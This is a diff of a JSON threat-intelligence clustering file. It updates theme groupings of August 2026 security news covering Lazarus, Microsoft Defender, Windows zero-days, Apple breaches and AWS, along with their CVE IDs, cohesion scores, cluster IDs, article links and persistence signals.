+      "cohesion": 0.249,
       "shared_strong_signals": [
         "Microsoft SharePoint"
       ],
@@ -8409,9 +8744,10 @@
         "17761b9ecf",
         "c13f381a5a",
         "ef336b7141",
+        "02b0e547f6",
         "927bf94c9b",
         "b4927a86ad",
-        "4d06d42e84",
+        "22bf2708a0",
         "7f18333ab6"
       ],
       "links": [
@@ -8419,72 +8755,72 @@
         "https://thehackernews.com/2026/08/researchers-disclose-ai-assisted.html",
         "https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/",
         "https://krebsonsecurity.com/2026/08/microsoft-plugs-nearly-400-security-holes/",
+        "https://www.darkreading.com/application-security/microsofts-patch-tuesday-deluge-continues",
         "https://www.securityweek.com/critical-sap-commerce-cloud-vulnerability-exploited-3-days-after-disclosure/",
         "https://thehackernews.com/2026/08/sap-commerce-cloud-flaw-could-let.html",
         "https://blog.talosintelligence.com/microsoft-patch-tuesday-for-august-2026/",
-        "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
         "https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html",
+        "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
         "https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html",
         "https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/"
       ]
     },
     {
-      "label": "Microsoft Defender exploitation (CVE-2026-50656)",
-      "anchor_signal": "Microsoft Defender",
-      "theme_key": "microsoft-defender",
+      "label": "data breach targeting Apple iOS/macOS",
+      "anchor_signal": "Apple iOS/macOS",
+      "theme_key": "apple-ios-macos",
       "dominant_features": {
         "threat_categories": [
-          "zero_day",
-          "ransomware_extortion",
           "data_breach",
-          "vulnerability_disclosure"
+          "zero_day",
+          "active_exploitation",
+          "phishing_social_eng"
+        ],
+        "affected_industries": [
+          "government",
+          "manufacturing_industrial",
+          "financial_services"
         ],
         "affected_products": [
-          "Microsoft Defender",
-          "Microsoft Windows"
-        ],
-        "cve_ids": [
-          "CVE-2026-50656"
+          "Apple iOS/macOS",
+          "Google Cloud",
+          "Fortinet"
         ],
         "urgency_signals": [
           "zero_day",
-          "poc_available"
+          "poc_available",
+          "no_patch_yet"
         ]
       },
-      "cluster_count": 6,
-      "article_count": 12,
-      "cohesion": 0.234,
+      "cluster_count": 5,
+      "article_count": 10,
+      "cohesion": 0.217,
       "shared_strong_signals": [
-        "Microsoft Defender"
+        "Apple iOS/macOS"
       ],
-      "member_cves": [
-        "CVE-2026-50656"
-      ],
+      "member_cves": [],
       "also_targets": [],
       "cluster_ids": [
-        "17761b9ecf",
-        "e3235a03c3",
-        "dcf9212f8f",
-        "963c57eb1b",
-        "21cbe0b5fa",
-        "8fb5179107"
+        "cb8fdf38e7",
+        "927bf94c9b",
+        "594fd8e6bd",
+        "1ac2c2cb37",
+        "20c2a82904"
       ],
       "links": [
-        "https://www.rapid7.com/blog/post/em-patch-tuesday-august-2026",
-        "https://thehackernews.com/2026/08/researchers-disclose-ai-assisted.html",
-        "https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/",
+        "https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/",
+        "https://www.securityweek.com/critical-sap-commerce-cloud-vulnerability-exploited-3-days-after-disclosure/",
+        "https://thehackernews.com/2026/08/sap-commerce-cloud-flaw-could-let.html",
         "https://www.securityweek.com/recent-macos-screen-sharing-vulnerability-exploited-in-attacks/",
         "https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/",
         "https://risky.biz/RBNEWS600/",
         "https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/",
-        "https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/",
-        "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
-        "https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/",
-        "https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html"
+        "https://www.securityweek.com/40000-impacted-by-safepal-data-breach/",
+        "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/"
       ]
     },
     {
-      "label": "Lazarus targeting Microsoft Windows",
+      "label": "Lazarus: zero day",
       "anchor_signal": "Lazarus",
       "theme_key": "lazarus",
       "dominant_features": {
@@ -8498,16 +8834,13 @@
         ],
         "affected_industries": [
           "financial_services",
-          "aviation_defense",
-          "government"
+          "aviation_defense"
         ],
         "affected_products": [
-          "OpenAI/ChatGPT",
-          "Microsoft Windows"
+          "OpenAI/ChatGPT"
         ],
         "cve_ids": [
-          "CVE-2026-68820",
-          "CVE-2025-49113"
+          "CVE-2026-68820"
         ],
         "urgency_signals": [
           "zero_day"
@@ -8515,7 +8848,7 @@
       },
       "cluster_count": 4,
       "article_count": 7,
-      "cohesion": 0.447,
+      "cohesion": 0.399,
       "shared_strong_signals": [
         "Lazarus"
       ],
@@ -8523,17 +8856,17 @@
       "also_targets": [],
       "cluster_ids": [
         "c13f381a5a",
-        "20c2a82904",
-        "4d06d42e84",
-        "7f18333ab6"
+        "22bf2708a0",
+        "7f18333ab6",
+        "20c2a82904"
       ],
       "links": [
         "https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/",
-        "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
-        "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
         "https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html",
+        "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
         "https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html",
-        "https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/"
+        "https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/",
+        "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/"
       ]
     },
     {
@@ -8577,51 +8910,50 @@
       ]
     },
     {
-      "label": "zero day targeting Microsoft Windows",
-      "anchor_signal": "Microsoft Windows",
-      "theme_key": "microsoft-windows",
+      "label": "Microsoft Defender exploitation (CVE-2026-50656)",
+      "anchor_signal": "Microsoft Defender",
+      "theme_key": "microsoft-defender",
       "dominant_features": {
         "threat_categories": [
           "zero_day",
           "vulnerability_disclosure"
         ],
-        "actor_attribution": [
-          "Lazarus"
-        ],
         "affected_products": [
-          "Microsoft Windows",
-          "Microsoft Defender"
+          "Microsoft Defender",
+          "Microsoft Windows"
         ],
         "cve_ids": [
-          "CVE-2026-50656",
-          "CVE-2026-68820"
+          "CVE-2026-50656"
         ],
         "urgency_signals": [
           "zero_day",
           "poc_available"
         ]
       },
-      "cluster_count": 4,
-      "article_count": 7,
-      "cohesion": 0.308,
+      "cluster_count": 5,
+      "article_count": 5,
+      "cohesion": 0.262,
       "shared_strong_signals": [
-        "Microsoft Windows"
+        "Microsoft Defender"
       ],
-      "member_cves": [],
+      "member_cves": [
+        "CVE-2026-50656"
+      ],
       "also_targets": [],
       "cluster_ids": [
+        "17761b9ecf",
         "dcf9212f8f",
-        "4d06d42e84",
-        "8fb5179107",
-        "7f18333ab6"
+        "963c57eb1b",
+        "21cbe0b5fa",
+        "8fb5179107"
       ],
       "links": [
+        "https://www.rapid7.com/blog/post/em-patch-tuesday-august-2026",
+        "https://thehackernews.com/2026/08/researchers-disclose-ai-assisted.html",
         "https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/",
-        "https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/",
-        "https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html",
-        "https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html",
-        "https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html",
-        "https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/"
+        "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
+        "https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/",
+        "https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html"
       ]
     },
     {
@@ -8660,91 +8992,44 @@
       ]
     },
     {
-      "label": "ShinyHunters targeting Apple iOS/macOS",
-      "anchor_signal": "ShinyHunters",
-      "theme_key": "shinyhunters",
+      "label": "zero day targeting Microsoft Windows",
+      "anchor_signal": "Microsoft Windows",
+      "theme_key": "microsoft-windows",
       "dominant_features": {
         "threat_categories": [
-          "ransomware_extortion",
-          "phishing_social_eng",
           "zero_day",
-          "data_breach"
-        ],
-        "actor_attribution": [
-          "ShinyHunters"
-        ],
-        "affected_industries": [
-          "financial_services"
+          "vulnerability_disclosure"
         ],
         "affected_products": [
-          "Apple iOS/macOS",
-          "Fortinet"
+          "Microsoft Windows",
+          "Microsoft Defender"
+        ],
+        "cve_ids": [
+          "CVE-2026-50656"
         ],
         "urgency_signals": [
           "zero_day",
-          "no_patch_yet"
+          "poc_available"
         ]
       },
       "cluster_count": 3,
-      "article_count": 3,
-      "cohesion": 0.65,
+      "article_count": 5,
+      "cohesion": 0.33,
       "shared_strong_signals": [
-        "ShinyHunters"
+        "Microsoft Windows"
       ],
       "member_cves": [],
       "also_targets": [],
       "cluster_ids": [
-        "75a2a6649a",
-        "b3aa07bd4c",
-        "a06704d870"
+        "dcf9212f8f",
+        "8fb5179107",
+        "7f18333ab6"
       ],
       "links": [
-        "https://www.bleepingcomputer.com/news/security/ringcentral-data-breach-exposed-info-of-16-million-accounts/",
-        "https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/",
-        "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/"
-      ]
-    },
-    {
-      "label": "phishing social eng targeting VMware",
-      "anchor_signal": "VMware",
-      "theme_key": "vmware",
-      "dominant_features": {
-        "threat_categories": [
-          "phishing_social_eng",
-          "zero_day",
-          "data_breach"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government"
-        ],
-        "affected_products": [
-          "VMware",
-          "Apple iOS/macOS",
-          "Fortinet"
-        ],
-        "urgency_signals": [
-          "zero_day",
-          "no_patch_yet"
-        ]
-      },
-      "cluster_count": 3,
-      "article_count": 3,
-      "cohesion": 0.304,
-      "shared_strong_signals": [
-        "VMware"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "1ac2c2cb37",
-        "4535ef9ae8",
-        "b3aa07bd4c"
-      ],
-      "links": [
-        "https://www.securityweek.com/40000-impacted-by-safepal-data-breach/",
-        "https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html",
-        "https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/"
+        "https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/",
+        "https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html",
+        "https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html",
+        "https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/"
       ]
     },
     {
@@ -8834,16 +9119,74 @@
         "https://unit42.paloaltonetworks.com/kimwolf-v7-botnet-malware/",
         "https://unit42.paloaltonetworks.com/aeternum-blockchain-c2-analysis/"
       ]
+    },
+    {
+      "label": "data breach targeting AWS",
+      "anchor_signal": "AWS",
+      "theme_key": "aws",
+      "dominant_features": {
+        "threat_categories": [
+          "data_breach"
+        ],
+        "affected_products": [
+          "AWS"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 5,
+      "cohesion": 0.2,
+      "shared_strong_signals": [
+        "AWS"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "6a4c525838",
+        "20c2a82904"
+      ],
+      "links": [
+        "https://horizon3.ai/intelligence/blogs/aws-attack-paths-pentest-wednesday/",
+        "https://www.securityweek.com/over-1000-charities-hit-by-beacon-crm-data-breach/",
+        "https://www.infosecurity-magazine.com/news/exposed-aws-key-data-charities/",
+        "https://www.schneier.com/blog/archives/2026/08/prompt-injections-for-defense.html",
+        "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/"
+      ]
+    },
+    {
+      "label": "Microsoft BitLocker vulnerability activity",
+      "anchor_signal": "Microsoft BitLocker",
+      "theme_key": "microsoft-bitlocker",
+      "dominant_features": {
+        "affected_products": [
+          "Microsoft BitLocker"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 2,
+      "cohesion": 0.2,
+      "shared_strong_signals": [
+        "Microsoft BitLocker"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "dcf9212f8f",
+        "c63d21cf7f"
+      ],
+      "links": [
+        "https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/",
+        "https://www.ncsc.gov.uk/blogs/how-bitlocker-pins-help-protect-your-data-and-devices"
+      ]
     }
   ],
   "forward_signals": {
     "novelty": {
       "cves": [
         {
-          "value": "CVE-2026-69414",
-          "cluster_id": "dcf9212f8f",
-          "first_source": "BleepingComputer",
-          "first_published": "2026-08-17T09:05:33+00:00"
+          "value": "CVE-2026-65400",
+          "cluster_id": "594fd8e6bd",
+          "first_source": "SecurityWeek",
+          "first_published": "2026-08-17T08:47:38+00:00"
         }
       ],
       "actors": [],
@@ -8985,12 +9328,6 @@
         "weeks_observed": 11
       },
       {
-        "axis": "cve_ids",
-        "value": "CVE-2026-33825",
-        "cluster_id": "e3235a03c3",
-        "weeks_observed": 6
-      },
-      {
         "axis": "actor_attribution",
         "value": "Cl0p",
         "cluster_id": "fb556ca51b",
@@ -9000,18 +9337,18 @@
         "axis": "cve_ids",
         "value": "CVE-2026-50656",
         "cluster_id": "17761b9ecf",
+        "weeks_observed": 5
+      },
+      {
+        "axis": "actor_attribution",
+        "value": "Lazarus",
+        "cluster_id": "c13f381a5a",
         "weeks_observed": 4
       },
       {
         "axis": "cve_ids",
         "value": "CVE-2026-15409",
         "cluster_id": "e15b654037",
-        "weeks_observed": 4
-      },
-      {
-        "axis": "cve_ids",
-        "value": "CVE-2026-50751",
-        "cluster_id": "e3235a03c3",
         "weeks_observed": 4
       },
       {
@@ -9030,12 +9367,6 @@
         "axis": "cve_ids",
         "value": "CVE-2026-18577",
         "cluster_id": "67b968df05",
-        "weeks_observed": 3
-      },
-      {
-        "axis": "actor_attribution",
-        "value": "Lazarus",
-        "cluster_id": "c13f381a5a",
         "weeks_observed": 3
       },
       {
